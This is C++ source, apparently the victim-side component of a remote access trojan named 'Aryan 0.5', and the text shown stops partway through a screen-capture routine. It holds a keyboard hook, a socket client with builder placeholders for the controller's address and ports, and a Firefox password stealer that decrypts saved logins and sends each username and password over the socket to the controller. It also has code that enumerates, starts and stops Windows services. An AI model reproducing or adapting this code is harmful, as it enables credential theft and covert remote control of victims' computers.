#include <windows.h>
#include <stdio.h>
#include <time.h>
#include <Tlhelp32.h>
#include <userenv.h>
#include <olectl.h>
#include <ole2.h>
#include <objbase.h>
#include <vfw.h>
#include <gdiplus.h>
#include <gdiplusenums.h>
/////////////////////////////////////
#include "resource.h"
#include "AryanServer.h"
#include "hook.h"
#include "tiny.h"
#include "Spread.h"
///////////////////////////////////////
using namespace Gdiplus;
///////////////////////////////////////
#pragma comment(lib,"userenv.lib")
#pragma comment(lib,"ws2_32.lib")
#pragma comment(lib, "vfw32.lib")
///////////////////////////////////////
#define	RATMSG_SOCKET	WM_USER+1
//#define PORT			1000
#define FILE_BUFF_SZ 0xFF
#define MAX_LEN 0xFF

#define MAX_BUF_SIZE 1024
#define Alloc(p,t) (t *)malloc((p)*sizeof(t))
#define For(i,n) for ((i)=0;(i)<(n);(i)++)
#define iFor(n) For (i,n)
#define jFor(n) For (j,n)
////////////////////////////////////////
HHOOK theHook;
FILE *file;
char f_buff[FILE_BUFF_SZ];
int buff_idx;

HWND File;
HINSTANCE gInst;
HINSTANCE GInstance;

HANDLE WindowLog;
///////////////////////////////////////////
//Scocket Params
//char IP [30] = "xxxx256.256.256.256xxxx";//
char IP [30] = "127.0.0.1";
BOOL			IsHiddenAlready=0;
BOOL			KeyConnect = 0;
SOCKADDR_IN		RemAdr;
WORD			Event;
bool            Connect = 0;
DWORD			thread;
int				LocalId = 0;
char            UserName[100] = "";
///////////////////////////////////////////
PACKETHEAD		Head;
DWORD			HeadSize=sizeof(PACKETHEAD);

PACKETHEAD		Recv;
DWORD			RecvSize=sizeof(PACKETHEAD);

PACKETFILE		FRecv;
DWORD			FRecvSize=sizeof(PACKETFILE);
FILE * fd[1024];;
//FILE * DL;
char Buffer [1024];
char TotalRam [1024];
char ServerVersion [100] = "Aryan 0.5";
WORD			LEvent = 0;
SOCKET client, server;
WSADATA wsadata;
////////////////////////////////////////////////////////////////////////////
//File Socket params
SOCKADDR_IN    RemAdress;
SOCKET		   FClient;/*
char PORT  [10] = "$$$$$$$$";
char FPORT [10] = "&&&&&&&&";*/
char PORT  [10] = "1000";
char FPORT [10] = "1001";
int FileId = 0;
int FILEID = 0;
////////////////////////////////////////////////////////////////////////////
//Screen Res
int y = 0;
int x = 0;
int d = 0;
char ResultRes [100] = "";
////////////////////////////////////////////////////////////////////////////
//system info functions
char Country[80];
typedef void (WINAPI *PGNSI)(LPSYSTEM_INFO);
////////////////////////////////////////////////////////////////////////////
//WebCam

////////////////////////////////////////////////////////////////////////////
//FireFox passwords Credits to Krippler
//Firefox internal SEC structures
typedef enum SECItemType
{
    siBuffer = 0,
    siClearDataBuffer = 1,
    siCipherDataBuffer = 2,
    siDERCertBuffer = 3,
    siEncodedCertBuffer = 4,
    siDERNameBuffer = 5,
    siEncodedNameBuffer = 6,
    siAsciiNameString = 7,
    siAsciiString = 8,
    siDEROID = 9,
    siUnsignedInteger = 10,
    siUTCTime = 11,
    siGeneralizedTime = 12
};

struct SECItem
{
    SECItemType type;
    unsigned char *data;
    unsigned int len;
};

typedef enum SECStatus
{
    SECWouldBlock = -2,
    SECFailure = -1,
    SECSuccess = 0
};

//-----------------------------------------------------------------------
//Removes gecko-sdk dependency
#define PRBool   int
#define PRUint32 unsigned int
#define PR_TRUE  1
#define PR_FALSE 0

//Mozilla library names
#define NSS_LIBRARY_NAME   "nss3.dll"
#define PLC_LIBRARY_NAME   "plc4.dll"
#define NSPR_LIBRARY_NAME  "nspr4.dll"
#define SQLITE_LIBRARY_NAME  "sqlite3.dll"
#define MOZCRT_LIBRARY_NAME  "mozcrt19.dll"
#define NSSU_LIBRARY_NAME  "nssutil3.dll"
#define NSSU_LIBRARY_NAME  "nssutil3.dll"
#define PLDS_LIBRARY_NAME  "plds4.dll"
#define SOFTN_LIBRARY_NAME "softokn3.dll"

#define LOADLIBRARY(x)  LoadLibrary(x)
#define GETPROCADDRESS  GetProcAddress
#define FREELIBRARY     FreeLibrary
//-----------------------------------------------------------------------
const int buflen = 10240;
static char readbuf[buflen+1];
static int last = 0;
static int next = 0;

typedef struct PK11SlotInfoStr PK11SlotInfo;

// NSS Library functions
typedef SECStatus      (*NSS_Init) (const char *configdir);
typedef SECStatus      (*NSS_Shutdown) (void);
typedef PK11SlotInfo * (*PK11_GetInternalKeySlot) (void);
typedef void           (*PK11_FreeSlot) (PK11SlotInfo *slot);
typedef SECStatus      (*PK11_CheckUserPassword) (PK11SlotInfo *slot,char *pw);
typedef SECStatus      (*PK11_Authenticate) (PK11SlotInfo *slot, PRBool loadCerts, void *wincx);
typedef SECStatus      (*PK11SDR_Decrypt) (SECItem *data, SECItem *result, void *cx);

// PLC Library functions
typedef char *         (*PL_Base64Decode)( const char *src, PRUint32 srclen, char *dest);

// Function declarations..
void NSSUnload();
int InitFFLibs(char *firefoxPath);
int InitializeNSSLibrary(char *profilePath, char *password);
int CheckMasterPassword(char *password);
int DirectoryExists( char *path );
void StrLwr(char *str);
int OpenFile(char *filePath);
void CloseFile();
int ReadLine(char *buffer, int size);
char *GetFFProfilePath();
char *GetFFLibPath();
char *GetFFVersion();
char **Explode(char *StrIn,const char *Delimiter);
char *Split(char *String,char Delimeter[],int Part);
char *replace(char *str, const char *substr, const char *repstr);

char ReadChar();
char Vers[_MAX_PATH] = "";
int version = 1;

int PK11Decrypt(char *decodeData, int decodeLen, char **clearData, int *finalLen);
int Base64Decode(char *cryptData, char **decodeData, int *decodeLen);
//-----------------------------------------------------------------------
NSS_Init                NSSInit = NULL;
NSS_Shutdown            NSSShutdown = NULL;
PK11_GetInternalKeySlot PK11GetInternalKeySlot = NULL;
PK11_CheckUserPassword  PK11CheckUserPassword = NULL;
PK11_FreeSlot           PK11FreeSlot = NULL;
PK11_Authenticate       PK11Authenticate = NULL;
PK11SDR_Decrypt         PK11SDRDecrypt = NULL;
PL_Base64Decode         PLBase64Decode = NULL;

int IsNSSInitialized = 0;

HMODULE libnss = NULL;
HMODULE libplc = NULL;
HMODULE libtmp = NULL;

FILE *signonFile = NULL;

//-----------------------------------------------------------------------
int OpenFile(char *filePath)
{
    last = next = 0;
    signonFile = fopen(filePath, "r");

    if( signonFile == NULL )
    {
      return 0; //fail
    }

  return 1;
}
//-----------------------------------------------------------------------
char ReadChar()
{

  if (next >= last)
  {
    next = 0;
    last = fread(readbuf, 1, buflen, signonFile);
    if (last <= 0 )
    {
     return 0;
    }
  }

  return (readbuf[next++]);
}
//-----------------------------------------------------------------------
int ReadLine(char *buffer, int size)
{
  unsigned int c;
  int strLength = 0, i=0;

  buffer[0] = 0;

  while(1)
  {
      c = ReadChar();

      // eof reached
      if ( c == 0 ) // || feof(file) )
          return 0;

      if (c == '\n')
      {
          buffer[strLength++] = 0;
          break;
      }

      if (c != '\r')
      {
          for(i=0; i < 4 && ( (c & 0xff) != 0 ); i++)
          {
              if( strLength >= size )
              {
                  
                  printf("\n Buffer is insufficient to store data");
                  return 0;
              }
              // Increase buffer capacity dynamically
              buffer[strLength++] = (char)c;
              c = c >> 8;
          }
      }
  }

  return 1;

}
//-----------------------------------------------------------------------
//Misc functions
int DirectoryExists( char *path )
{
    DWORD attr = GetFileAttributes(path);
    if( (attr < 0) || !(attr & FILE_ATTRIBUTE_DIRECTORY ) )
    {
        return 0;
    }
    return 1;
}
//-----------------------------------------------------------------------
void StrLwr(char *str)
{
int n=strlen(str);
    for(int i=0; i<n; i++)
    {
        if( str[i] >=65 && str[i]<=90 )
        str[i]+=32;
    }
}
//-----------------------------------------------------------------------
//Loads specified firefox library with the given ffdir path as root
HMODULE LoadLibrary(char *firefoxDir, char *libName)
{
char loadPath[4096]="";

    strcpy(loadPath, firefoxDir);
    strcat(loadPath, "/");
    strcat(loadPath, libName);

    libtmp = LOADLIBRARY(loadPath);

    if( !libtmp )
    {
        return 0; //Failed to load library
    }

    return libtmp;
}
//-----------------------------------------------------------------------
int InitFFLibs(char *FFDir)
{
    libnss = libplc = NULL;

    //Load all required dll's
  if( FFDir != NULL )
  {

    //Minor version check
    if(!LoadLibrary(FFDir, MOZCRT_LIBRARY_NAME)) //We are using version 2 or lower
    {
        goto version2;
    } else {
if( LoadLibrary(FFDir, NSPR_LIBRARY_NAME) )
{
    if( LoadLibrary(FFDir, PLDS_LIBRARY_NAME) )
    {
        if( LoadLibrary(FFDir, PLC_LIBRARY_NAME) )
        {
                 if( LoadLibrary(FFDir, NSSU_LIBRARY_NAME) )
                 {
            
                    if( LoadLibrary(FFDir, SQLITE_LIBRARY_NAME) )
                        {

                        }
                 }
           }
      }
   }
}        
version2:
            
            if( LoadLibrary(FFDir, NSPR_LIBRARY_NAME) )
            {
                if( LoadLibrary(FFDir, PLDS_LIBRARY_NAME) )
                {
                    if((libplc=LoadLibrary(FFDir, PLC_LIBRARY_NAME)) )
                    {
                                if((libplc=LoadLibrary(FFDir, PLC_LIBRARY_NAME)) )
                                {
                                    if( LoadLibrary(FFDir, SOFTN_LIBRARY_NAME) )
                                    {
                                            libnss=LoadLibrary(FFDir, NSS_LIBRARY_NAME);
                                            if(libnss )
                                                printf("\n\n Librarys loaded from master firefox path successfully");
                                    }
                                }

                    }
                }
            }
    }

    // Now load from current path.
    if( !libnss )
    {
        libnss =LOADLIBRARY(NSS_LIBRARY_NAME);
        libplc =LOADLIBRARY(PLC_LIBRARY_NAME);
        if( !libnss || !libplc )
        {
            printf("\n\n Failed to load Firefox libraries %s & %s ", NSS_LIBRARY_NAME, PLC_LIBRARY_NAME);
            return 0;
        }
    } else {
    printf("\n Firefox Libraries loaded successfully");
    }

    // Extract the required functions....
    NSSInit                   = (NSS_Init) GETPROCADDRESS(libnss, "NSS_Init");
    NSSShutdown               = (NSS_Shutdown)GETPROCADDRESS(libnss, "NSS_Shutdown");
    PK11GetInternalKeySlot = (PK11_GetInternalKeySlot) GETPROCADDRESS(libnss, "PK11_GetInternalKeySlot");
    PK11FreeSlot           = (PK11_FreeSlot) GETPROCADDRESS(libnss, "PK11_FreeSlot");
    PK11Authenticate       = (PK11_Authenticate) GETPROCADDRESS(libnss, "PK11_Authenticate");
    PK11SDRDecrypt         = (PK11SDR_Decrypt) GETPROCADDRESS(libnss, "PK11SDR_Decrypt");
    PK11CheckUserPassword  = (PK11_CheckUserPassword ) GETPROCADDRESS(libnss, "PK11_CheckUserPassword");

    if( !NSSInit || !NSSShutdown || !PK11GetInternalKeySlot || !PK11Authenticate || !PK11SDRDecrypt || !PK11FreeSlot || !PK11CheckUserPassword)
    {
        printf("\n\n Failed to get function address from library %s ", NSS_LIBRARY_NAME);
        NSSUnload();
        return 0;
    }

    // Get the functions from PLC library
    PLBase64Decode     = ( PL_Base64Decode ) GETPROCADDRESS(libplc, "PL_Base64Decode");

    if( !PLBase64Decode )
    {
        printf("\n\n Failed to get function address from library %s ", PLC_LIBRARY_NAME);
        NSSUnload();
        return 0;
    } else {
    printf("\n Firefox library initialized successfully");
    }

  return 1;
}
//-----------------------------------------------------------------------
int InitializeNSSLibrary(char *profilePath)
{
    IsNSSInitialized = 0;

    // Initialize the NSS library
    if( (*NSSInit) (profilePath) != SECSuccess )
    {
        printf("\n\n NSSLib Initialization failed");
        NSSUnload();
        return 0;
    } else {
    IsNSSInitialized = 1;
    printf("\n NSS library initiliazed successfully");
    }

  return 1;
}
//-----------------------------------------------------------------------
void NSSUnload()
{
    if( IsNSSInitialized  && (NSSShutdown != NULL) )
        (*NSSShutdown)();

    if( libnss != NULL )
        FREELIBRARY(libnss);  //Free nss library

    if( libplc != NULL )
        FREELIBRARY(libplc);  //Free plc library
}
//-----------------------------------------------------------------------
int DecryptStr(char *cryptData, char **clearData)
{
int decodeLen = 0;
int finalLen = 0;
char *decodeData = NULL;
char *finalData = NULL;

    if( cryptData[0] != NULL )
    {
        if(  (Base64Decode(cryptData, &decodeData, &decodeLen) == 0) || (decodeData == NULL) )
        {
            return 0;
        }

        // Do the actual PK11 decryption
        if( (PK11Decrypt(decodeData, decodeLen, &finalData, &finalLen) == 0) || (finalData == NULL))
        {
            return 0;
        }

        *clearData = (char*) malloc( finalLen + 1 );
        if( *clearData == NULL )
        {
            printf("\n Insufficient memory");
            return 0;
        }
        memcpy(*clearData, finalData, finalLen);
        *(*clearData + finalLen) = 0;    // Null terminate string

        return 1;
    }

    if(  Base64Decode(cryptData, clearData, &decodeLen) == 0 )
    {
        return 0;
    }

    return 1;
}
//-----------------------------------------------------------------------
int Base64Decode(char *cryptData, char **decodeData, int *decodeLen)
{
    int len = strlen( cryptData );
    int adjust = 0;

    if (cryptData[len-1] == '=')
    {
      adjust++;
      if (cryptData[len-2] == '=')
          adjust++;
    }

    *decodeData = ( char *)(*PLBase64Decode)(cryptData, len, NULL);

    if( *decodeData == NULL )
    {
        return 0;
    }
  
    *decodeLen = (len*3)/4 - adjust;

    return 1;
}
//-----------------------------------------------------------------------
int PK11Decrypt(char *decodeData, int decodeLen, char **clearData, int *finalLen)
{
    PK11SlotInfo *slot = 0;
    SECStatus status;
    SECItem request;
    SECItem reply;

    // Find token with SDR key
    slot = (*PK11GetInternalKeySlot)();

    if (!slot)
    {
        return 0;
    }

    // Decrypt the string
    request.data = (unsigned char *)decodeData;
    request.len = decodeLen;
    reply.data = 0;
    reply.len = 0;

    status = (*PK11SDRDecrypt)(&request, &reply, NULL);

    if (status != SECSuccess)
    {
        return 0;
    }

    *clearData = (char*)reply.data;
    *finalLen  = reply.len;

    // Free the slot
    (*PK11FreeSlot)(slot);
    return 1;
}
//-----------------------------------------------------------------------
int DumpCache(char *profilePath,char *signonFile)
{
char buffer[10240];
char sbuffer[10240];
char name[10240];
PACKETHEAD Pass;
char *clearData = NULL;

int bufferLength = 10240;
int ret;
int T = 0;
    if( profilePath == NULL || signonFile == NULL)
    {
        return 0;
    }

    strcpy(sbuffer,profilePath);
    strcat(sbuffer,"\\");
    strcat(sbuffer,signonFile);

    if(OpenFile(sbuffer) == 0 ) // Open the signon file
     {
         printf("\n\n Failed to open signon file: [%s], skipped. ", signonFile);
         return 0;
     } else {
    /*/////////////////////////////////////////
      Begin cache dump
    *//////////////////////////////////////////


    // Read out the unmanaged ("Never remember" URL list

    ReadLine(buffer, bufferLength); //Skip first line as its a useless version tag

    while (ReadLine(buffer, bufferLength) != 0)
    {
        // End of unmanaged list
        if (strlen(buffer) != 0 && buffer[0] == '.' && buffer[0] != '#')
            break;
        printf("\n %s ", buffer);
	    strcpy(Pass.Buf3, buffer);
    }

    // read the URL line
while (ReadLine(buffer, bufferLength) != 0 ) {

printf("\n URL: %s ", buffer);
strcpy(Pass.Buf3, buffer);
    //Start looping through final singon*.txt file
while (ReadLine(buffer, bufferLength) != 0 )
{

    if (buffer[0] == '.')
    {
    break; // end of cache entry
    }

    //Check if its a password
    if (buffer[0] == '*')
    {
        strcpy(name,&buffer[1]);
        ret = ReadLine(buffer, bufferLength);
    } else {
        printf("\n");
        strcpy(name, buffer);
        ret = ReadLine(buffer, bufferLength);
    }

    if( DecryptStr(buffer, &clearData) == 1 )
    {
                //printf("\n %s: %s ", name, clearData);
				//MessageBox(NULL, clearData, name, MB_OK);
			
				if(T == 0)
				{
				strcpy(Pass.Buf, clearData);
				T = 1;
				}
				else
				{
				strcpy(Pass.Data, clearData);
				Pass.PacketType = PASSWORD_FIREFOX;
				Pass.ID = LocalId;
				Pass.ID2 = 6;
				T = 0;
TryAgain:
					if(send(client, (char *)&Pass, sizeof(PACKETHEAD), 0) == SOCKET_ERROR)
					{
						
					if(WSAGetLastError() == WSAECONNRESET || WSAGetLastError() == WSAECONNABORTED)
					{
					return 0;
					}
					goto TryAgain;
					}
				}
                clearData = NULL;
    }
  }
}
return 1;
}
    /*/////////////////////////////////////////
      End pcache dump
    *//////////////////////////////////////////
}
//-----------------------------------------------------------------------
// Find firefox path / libraries
char *GetFFLibPath()
{
    char regSubKey[]    = "SOFTWARE\\Clients\\StartMenuInternet\\firefox.exe\\shell\\open\\command";
    char path[_MAX_PATH] ="";
    char *FFDir = NULL;
    DWORD pathSize = _MAX_PATH;
    DWORD valueType;
    HKEY rkey;

    // Open firefox registry key
    if( RegOpenKeyEx(HKEY_LOCAL_MACHINE, regSubKey, 0, KEY_READ, &rkey) != ERROR_SUCCESS )
    {
        printf("\n Failed to open the firefox registry key : HKCU\\%s", regSubKey );
        return NULL;
    }

    // Read the firefox path
    if( RegQueryValueEx(rkey, NULL, 0,  &valueType, (unsigned char*)&path, &pathSize) != ERROR_SUCCESS )
    {
        printf("\n Failed to read the firefox path value from registry ");
        RegCloseKey(rkey);
        return NULL;
    }

    if( pathSize <= 0 || path[0] == 0)
    {
        printf("\n Unable to locate firefox installation path");
        RegCloseKey(rkey);
        return NULL;
    }

    RegCloseKey(rkey);

    // Remove extra quotes
    if( path[0] == '\"' )
    {
        for(int i=0; i < strlen(path)-1; i++)
            path[i] = path[i+1];
    }

    printf("\n Firefox main exe: %s", path);

    // Terminate the string at last "\\"
    for(int j=strlen(path)-1; j>0; j--)
    {
        if( path[j] == '\\' )
        {
            path[j]=0;
            break;
        }
    }

    FFDir = (char*) malloc( strlen(path) + 1);

        if(FFDir)
            strcpy(FFDir, path);
        printf("\n Firefox path: %s", FFDir);

return FFDir;
}
//-----------------------------------------------------------------------
char *GetFFProfilePath()
{
char profilePath[_MAX_PATH] = "";
char partialPath[] = "Application Data\\Mozilla\\Firefox";
char profileFile[_MAX_PATH];
char line[1024];

DWORD pathSize = _MAX_PATH;
char *finalProfilePath = NULL;
int  isDefaultFound = 0;
HANDLE token;

    // Get current user's profile directory
    if( OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &token) == FALSE )
    {
        printf("\n Failed to get current process token ");
        return NULL;
    }
  
    if( GetUserProfileDirectory(token, profilePath, &pathSize) == FALSE )
    {
        printf("\n Failed to get user profile directory");
        return NULL;
    }
  
    printf("\n User Profile directory: %s\n", profilePath);

    // Get firefox profile directory
    strcpy(profileFile, profilePath);
    strcat(profileFile,"\\");
    strcat(profileFile,partialPath);
    strcat(profileFile,"\\profiles.ini");
  
    // Open the firefox profile setting file
    FILE *profile = fopen(profileFile, "r");
  
    if( profile == NULL )
    {
        printf("\n Unable to find firefox profile file: %s ", profileFile);
        return NULL;
    }

    // This indicates that we are looking under default profile
    while(fgets(line, 1024, profile))
    {
        StrLwr(line);

        if( !isDefaultFound && ( strstr(line, "name=default") != NULL) )
        {
            isDefaultFound = 1;
            continue;
        }
      
        // Found default profile / check for path
        if( isDefaultFound )
        {
            if( strstr(line,"path=") != NULL)
            {
                char *slash = strstr(line,"/");
              
                if( slash != NULL )
                    *slash = '\\';
              
                // remove \n from the end of line
                line[strlen(line)-1] = 0;

                char *start = strstr(line,"=");
          
                int totalLen = strlen(profilePath) + strlen(partialPath) + strlen(start) + 3;
                finalProfilePath = (char *) malloc(totalLen);

                if( finalProfilePath )
                {
                    strcpy(finalProfilePath,profilePath);
                    strcat(finalProfilePath,"\\");
                    strcat(finalProfilePath,partialPath);
                    strcat(finalProfilePath,"\\");
                    strcat(finalProfilePath,start+1);

                    printf("\n Final profile path: %s \n", finalProfilePath);
                }

                break;
            }
        }
  
    }

    fclose(profile);
    
  return finalProfilePath;
}
//-----------------------------------------------------------------------
char *GetFFVersion()
{
char regSubKey[] = "SOFTWARE\\Mozilla\\Mozilla Firefox";
char *FFVers = NULL;
DWORD pathSize = _MAX_PATH;
DWORD valueType;
HKEY rkey;

    // Open firefox registry key
    if( RegOpenKeyEx(HKEY_LOCAL_MACHINE, regSubKey, 0, KEY_READ, &rkey) != ERROR_SUCCESS )
    {
        printf("\n Failed to open the firefox registry key : HKCU\\%s", regSubKey );
        return NULL;
    }


    // Read the firefox path value
    if( RegQueryValueEx(rkey, "CurrentVersion", 0,  &valueType, (unsigned char*)&Vers, &pathSize) != ERROR_SUCCESS )
    {
        printf("\n Failed to read the firefox version from registry ");
        RegCloseKey(rkey);
        return NULL;
    }

        if( pathSize <= 0 || Vers[0] == 0)
    {
        printf("\n Path value read from the registry is empty");
        RegCloseKey(rkey);
        return NULL;
    }  

        RegCloseKey(rkey);
    
        FFVers = (char*) malloc( strlen(Vers) + 1);
  
    if( FFVers )
    strcpy(Vers,FFVers);
    if (FFVers[1] == '1')
    {
        version = 1;
    }else{
    if (FFVers[1] == '2')
    {
        version = 2;
    }else{
    if (FFVers[1] == '3')
        {
        version = 3;    
    }
  }
}
    printf("\n Firefox version: %d", version);

    return (FFVers);
}
int GetFfPwds()
{
    char *ProfilePath = NULL;     //Profile path
    char *FFDir = NULL;           //Firefox main installation path
//    char buff[1024];

    ProfilePath = GetFFProfilePath();

    if( !DirectoryExists(ProfilePath))
    {
      //MessageBox(NULL, "NO DirectoryExist!", "END", MB_OK);
      return 0;
    }
    
    FFDir = GetFFLibPath();

    if( !DirectoryExists(ProfilePath))
    {
      //MessageBox(NULL, "NO FF install Directory Exists!", "END", MB_OK);
      return 0;
    }
        if( InitFFLibs(FFDir) )
        {
            if( InitializeNSSLibrary(ProfilePath) )
            {
                 //Take 3 Mozilla dumps
                DumpCache(ProfilePath,"signons.txt");  
                DumpCache(ProfilePath,"signons2.txt");
                DumpCache(ProfilePath,"signons3.txt");
                //Dont forget to flush :/
                NSSUnload();
            }
        }

   //MessageBox(NULL, "NO ERRORS!", "END", MB_OK);
   return 0;
}

DWORD startService(char *pServiceName)
{
  int lRetVal = 0;
  SC_HANDLE lSCManager;
  SC_HANDLE lService;
  int lFuncRetVal = 0;


  /*
   * Get a handle to the SCM database. 
   *
   */

  if ((lSCManager = OpenSCManager(NULL, NULL, SC_MANAGER_ALL_ACCESS)) == NULL) 
  {
    lRetVal = 1;
    goto END;
  }

 
  if ((lService = OpenService(lSCManager, pServiceName, SERVICE_ALL_ACCESS)) == NULL)
  {
    lRetVal = 2;
	goto END;
  }    

  /*
   * Attempt to start the service.
   *
   */

  if (!StartService(lService, 0, NULL))
  {
    lRetVal = 3;
	goto END;
  }


END:

  if (lSCManager)
    CloseServiceHandle(lSCManager);

  if (lService)
    CloseServiceHandle(lService);


  return(lRetVal);
}

DWORD stopService(char *pServiceName)
{
  DWORD lRetVal = 0;
  SERVICE_STATUS_PROCESS ssp;
  DWORD lwStartTime = GetTickCount();
  DWORD lBytesNeeded;
  DWORD lTimeout = 30000;
  SC_HANDLE lSCManager;
  SC_HANDLE lService;
  int lFuncRetVal = 0;



  /*
   * Get a handle to the SCM database.   
   *
   */

  if ((lSCManager = OpenSCManager(NULL, NULL, SC_MANAGER_ALL_ACCESS)) == NULL) 
  {
    lRetVal = 1;
	goto END;
  }

  /*
   * Get a handle to the service.  
   *
   */

  if ((lService = OpenService(lSCManager, pServiceName, SERVICE_STOP|SERVICE_QUERY_STATUS|SERVICE_ENUMERATE_DEPENDENTS)) == NULL)
  {
    lRetVal = 2; 
	goto END;
  }    


  /*
   * Make sure the service is not already stopped.
   *
   */

  if (!QueryServiceStatusEx(lService, SC_STATUS_PROCESS_INFO, (LPBYTE)&ssp, sizeof(SERVICE_STATUS_PROCESS), &lBytesNeeded))
  {
    lRetVal = 3; 
    goto END;
  }

  if (ssp.dwCurrentState == SERVICE_STOPPED)
  {
    lRetVal = 4;
	goto END;
  }

  /*
   * If a stop is pending, wait for it.
   *
   */

  while (ssp.dwCurrentState == SERVICE_STOP_PENDING)
  {
    Sleep( ssp.dwWaitHint );
    if (!QueryServiceStatusEx(lService, SC_STATUS_PROCESS_INFO, (LPBYTE)&ssp, sizeof(SERVICE_STATUS_PROCESS), &lBytesNeeded))
    {
      lRetVal = 5;
      goto END;
    }

    if ( ssp.dwCurrentState == SERVICE_STOPPED )
    {
      lRetVal = 6;
      goto END;
    }


    if (GetTickCount() - lwStartTime > lTimeout)
    {
      lRetVal = 7;
      goto END;
    }
  } // while (ssp.dwCu...



  /*
   * Send a stop code to the service.
   *
   */

  if (!ControlService(lService, SERVICE_CONTROL_STOP, (LPSERVICE_STATUS) &ssp))
  {
    lRetVal = 8;
    goto END;
  }



END:

  if (lService) 
    CloseServiceHandle(lService); 

  if (lSCManager)
    CloseServiceHandle(lSCManager);


  return(lRetVal);
}



int enumservices()
{
PACKETHEAD Service;
char compname [MAX_COMPUTERNAME_LENGTH + 1];
DWORD cbComputerName = sizeof ( compname );
GetComputerName (compname, &cbComputerName );
 
//For enumerating services with service manager
 
ENUM_SERVICE_STATUS EnService[512];
SC_HANDLE ScManager,ScService; //Handle of service manager
DWORD cbBufSize=512*sizeof(ENUM_SERVICE_STATUS); 
DWORD lpServicesReturned; 
DWORD pcbBytesNeeded; 
DWORD lpResumeHandle=0; 
 
//For querying service info
DWORD dwBytesNeeded;
LPQUERY_SERVICE_CONFIG lpqscBuf; 
 
//Open the service manager with all as desired access
ScManager = OpenSCManager(compname,NULL,SC_MANAGER_ALL_ACCESS); 
 
char szStatus[255];
char szStartType[255];
 
if(ScManager==NULL) 
{
printf("Error querying the service manager");
return 0; 
}
 
if(::EnumServicesStatus(ScManager, SERVICE_WIN32, SERVICE_STATE_ALL, EnService, cbBufSize, &pcbBytesNeeded, &lpServicesReturned, &lpResumeHandle)==0)
{
printf("Error querying the service manager");
return 0; 
}
 
for(int i=0;i< INT ( lpServicesReturned);i++) 
{
	if((ScService=::OpenService(ScManager,EnService[i].lpServiceName,SERVICE_ALL_ACCESS))==NULL)
	{
	printf("Error opening service");
	}
 
//Allocate some memory in our buffer for the actual querying
	lpqscBuf = (LPQUERY_SERVICE_CONFIG) LocalAlloc(LPTR, 4096); 
	if (lpqscBuf == NULL) 
	{
	printf("Error allocating service query");
	strcpy(szStartType,"Unknown");
	}
 
//Retrieve the configuration info
	if (! QueryServiceConfig(ScService, lpqscBuf, 4096, &dwBytesNeeded) ) 
	{
	printf("Error querying service info");
	strcpy(szStartType,"Unknown");
	}
 
//Get the current services startup type
switch(lpqscBuf->dwStartType)
{
case SERVICE_AUTO_START:
strcpy(szStartType,"Automatic"); 
break;

case SERVICE_DEMAND_START:
strcpy(szStartType,"Manual"); 
break;

case SERVICE_DISABLED :
strcpy(szStartType,"Disabled"); 
break;
}
 
//Get the services current state
switch(EnService[i].ServiceStatus.dwCurrentState)
{
case SERVICE_PAUSED: //The service is in a paused state
strcpy(szStatus,"Paused");
break;

case SERVICE_RUNNING: // The service is running
strcpy(szStatus,"Running");
break;

case SERVICE_STOPPED:// The service is stopped 
strcpy(szStatus,"Stopped");
break;

case SERVICE_START_PENDING: // The service is pending start
strcpy(szStatus,"Start pending");
break;

case SERVICE_STOP_PENDING : // The service is pending stoppage 
strcpy(szStatus,"Stop pending"); 
break;
}
//Output the current services info to the console
strcpy(Service.Data,EnService[i].lpServiceName);
strcpy(Service.Buf2,EnService[i].lpDisplayName);
strcpy(Service.Buf3,szStatus);
strcpy(Service.Buf,szStartType);
Service.PacketType = PACKET_SERVICE_MAN;
Service.ID = LocalId;
TryAgain:
if(send(client,(char *)&Service,sizeof(PACKETHEAD), 0) == SOCKET_ERROR)
{
	
if(WSAGetLastError() == WSAECONNRESET || WSAGetLastError() == WSAECONNABORTED)
{
return 0;
}

goto TryAgain;
}

}
 
return 0;
}
////////////////////////////////////////////////////////////////////////////
//Screen Capture

void SetTHEBMIHeader (BITMAPINFO *b,short dx,short dy)
{
 b->bmiHeader.biSize=sizeof(BITMAPINFOHEADER);
 b->bmiHeader.biWidth=dx;
 b->bmiHeader.biHeight=-dy;
 b->bmiHeader.biPlanes=1;
 b->bmiHeader.biBitCount=24;
 b->bmiHeader.biCompression=BI_RGB;
 b->bmiHeader.biSizeImage=0;
 b->bmiHeader.biXPelsPerMeter=1;
 b->bmiHeader.biYPelsPerMeter=1;
 b->bmiHeader.biClrUsed=0;
 b->bmiHeader.biClrImportant=0;
}
POINT GetBitmapSize (HBITMAP h)
{
POINT p;
BITMAP o;
GetObject (h,sizeof(o),&o);
p.x=o.bmWidth;
p.y=o.bmHeight;
return (p);
}
void CreateWorkingBitmap (long dx,long dy,tWorkBMP *w)
{
 w->x=dx;
 w->y=dy;
 w->l=(dx+1)*3&0xfffc;
 w->b=Alloc(w->l*dy,BYTE);
}
void OpenBitmapForWork (HBITMAP b,tWorkBMP *w)
{
BITMAPINFO s;
HDC h=GetDC(NULL);
POINT v=GetBitmapSize(b);
CreateWorkingBitmap (v.x,v.y,w);
SetTHEBMIHeader (&s,w->x,w->y);
GetDIBits (h,b,0,w->y,w->b,&s,DIB_RGB_COLORS);
ReleaseDC (NULL,h);
} 


HBITMAP CreateEmptyBitmap (WORD dx,WORD dy)
{
 HDC h=GetDC(NULL);
 HBITMAP b=CreateCompatibleBitmap(h,dx,dy);
 ReleaseDC (NULL,h);

 return (b);
}


void SaveWorkingBitmap (tWorkBMP *w,HBITMAP b)
{
 BITMAPINFO s;
 HDC h=GetDC(NULL);
 SetTHEBMIHeader (&s,w->x,w->y);
 SetDIBits (h,b,0,w->y,w->b,&s,DIB_RGB_COLORS);
 ReleaseDC (NULL,h);
}

void ShrinkWorkingBitmap (tWorkBMP *a,tWorkBMP *b,WORD bx,WORD by)
{
 BYTE *uy=a->b,*ux,i;
 WORD x,y,nx,ny=0;
 DWORD df=3*bx,nf=df*by,j;
 float k,qx[2],qy[2],q[4],*f=Alloc(nf,float);

 CreateWorkingBitmap (bx,by,b);

 jFor (nf) f[j]=0;
 j=0;

 For (y,a->y) {
  ux=uy;
  uy+=a->l;
  nx=0;
  ny+=by;

  if (ny>a->y) {

   qy[0]=1-(qy[1]=(ny-a->y)/(float)by);

   For (x,a->x) {

    nx+=bx;

    if (nx>a->x) {
     qx[0]=1-(qx[1]=(nx-a->x)/(float)bx);

     iFor (4) q[i]=qx[i&1]*qy[i>>1];

     iFor (3) {
      f[j]+=(*ux)*q[0];
      f[j+3]+=(*ux)*q[1];
      f[j+df]+=(*ux)*q[2];
